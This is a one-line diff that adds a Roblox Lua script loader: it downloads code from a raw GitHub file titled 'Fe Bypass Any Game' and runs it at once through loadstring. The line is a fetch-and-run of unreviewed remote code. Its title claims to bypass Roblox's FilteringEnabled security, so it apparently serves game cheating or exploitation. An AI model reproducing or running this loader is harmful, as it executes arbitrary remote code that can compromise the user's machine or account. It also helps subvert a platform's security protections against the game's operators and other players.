@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/noyejel186/noyejel186/main/Fe%20Bypass%20Any%20Game"))()
